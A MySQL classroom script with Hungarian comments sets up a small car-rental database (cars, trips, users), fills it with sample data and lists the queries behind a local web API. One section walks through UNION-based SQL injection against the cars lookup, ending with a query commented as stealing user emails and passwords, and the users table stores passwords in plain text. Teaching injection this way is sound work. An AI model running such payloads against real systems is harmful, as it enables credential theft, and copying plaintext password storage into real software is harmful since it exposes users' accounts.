# Adatbázis létrehozás

CREATE DATABASE cars
	CHARACTER SET utf8
	COLLATE utf8_hungarian_ci;

# Táblák
CREATE TABLE cars.cars (
  id INT(11) NOT NULL AUTO_INCREMENT,
  name VARCHAR(255) NOT NULL,
  licenceNumber VARCHAR(255) DEFAULT NULL,
  hourlyRate INT(11) DEFAULT NULL,
  PRIMARY KEY (id)
)
ENGINE = INNODB;

CREATE TABLE cars.users (
  id INT(11) NOT NULL AUTO_INCREMENT,
  email VARCHAR(50) DEFAULT NULL,
  password VARCHAR(255) DEFAULT NULL,
  PRIMARY KEY (id)
)
ENGINE = INNODB,
CHARACTER SET utf8,
COLLATE utf8_hungarian_ci;


CREATE TABLE cars.trips (
  id INT(11) NOT NULL AUTO_INCREMENT,
  numberOfMinits INT(11) DEFAULT NULL,
  date DATETIME DEFAULT NULL,
  carId INT(11) DEFAULT NULL,
  PRIMARY KEY (id)
)
ENGINE = INNODB,
CHARACTER SET utf8,
COLLATE utf8_hungarian_ci;

ALTER TABLE cars.trips 
  ADD INDEX IDX_trips_carId(carId);

ALTER TABLE cars.trips 
  ADD CONSTRAINT FK_trips_cars_id FOREIGN KEY (carId)
    REFERENCES cars.cars(id);


# ---------------------------------
# Adatbevitel
# Kézi teszt adatokkal
DELETE FROM trips;
DELETE FROM cars;
DELETE FROM users;

INSERT cars 
  (id, name, licenceNumber, hourlyRate)
  VALUES
  (1, 'Mercedes', 'MM-111', 2000), (2, 'Fiat', 'FF-111', 2100), (3, 'BMW', 'BB-111', 2200);

INSERT trips 
  (id, numberOfMinits, date, carId)
  VALUES
  (1, 25, '2022.10.13 12:20:00', 1), (2, 35, '2022.10.13 13:30:00', 1), (3, 20, '2022.10.13 14:20:00', 1),
  (4, 25, '2022.10.13 12:30:00', 2), (5, 15, '2022.10.13 13:40:00', 2),
  (6, 30, '2022.10.13 12:10:00', 3), (7, 15, '2022.10.13 14:30:00', 3), (8, 25, '2022.10.13 15:10:00', 3);

INSERT users 
  (id, email, password)
  VALUES
  (1,'jozsi@gmail.com','jozsijelszo'),(2,'bela@gmail.com','belajelszo'),(3,'feri@gmail.com','ferijelszo');

# Lekérdezések
SELECT * FROM cars;
SELECT * FROM trips;
SELECT * FROM users;

# Tárolt eljárással
CALL tesztAdatokKezi();

# tárolt függvények teszt:
select randomInteger(1,3);
select randomRendszam('Mercedesz');
select randomAuto();

CALL tesztAdatokAutomata(10, '2022.10.13 12:00:00', 2, 5);


# -------------------------------------
# sql injection
# union
SELECT * FROM cars union SELECT * FROM cars;
SELECT * FROM cars UNION ALL SELECT * FROM cars;
SELECT * FROM cars union SELECT *, '' FROM users;

# Mi az adatbázis neve
SELECT * FROM cars
  WHERE id = 1 UNION SELECT database(), '', '', '';

# Milyen táblák vannak
SELECT * FROM cars
  WHERE id = 1 union select table_name, '','', '' from information_schema.tables where table_schema='cars';

# cars tábla oszlopai
SELECT * FROM cars
  WHERE id = 1 union select column_name, '', '', data_type from information_schema.columns where table_name='users' and table_schema='cars';

# user adatok kilopása
SELECT * FROM cars
  WHERE id = 1 union select email, password, '','' from users;


# ----------------------------
# Lekérdezések

# get http://localhost:3000/cars/1
SELECT * FROM cars
  WHERE id = 1;


## Adatmanipulációk
# car törlés
DELETE FROM cars
  WHERE id = 3;

# car hozzáadás
INSERT cars 
  (name, licenceNumber, hourlyRate)
  VALUES
  ('BMW', 'BB-111', 2200);

# car módosítás
UPDATE cars SET
  name = 'Mercedes',
  licenceNumber = 'MM-111',
  hourlyRate = 2200
  WHERE id = 4;

# adott kocsi trips-jei
SELECT id, numberOfMinits, DATE_FORMAT(date, '%Y.%m.%d %h:%i:%s') date from trips
  WHERE carId = 1;

# trips by id
SELECT id, numberOfMinits, DATE_FORMAT(date, '%Y.%m.%d %h:%i:%s') date from trips
  WHERE id = 9;

# trips by id
SELECT id, numberOfMinits, DATE_FORMAT(date, '%Y.%m.%d %h:%i:%s') date from trips;

# insert trips
INSERT trips 
  (numberOfMinits, date, carId)
  VALUES
  (25, '2022.10.13 12:20:00', 1);



# lekérdezések
select * from cars c
  inner join trips t on c.id = t.carId;

select count(*) countUserEmail from users where userName = 'h'
UNION all
  select count(*) countEmail from users where email = 'feher.h@gmail.com'
;
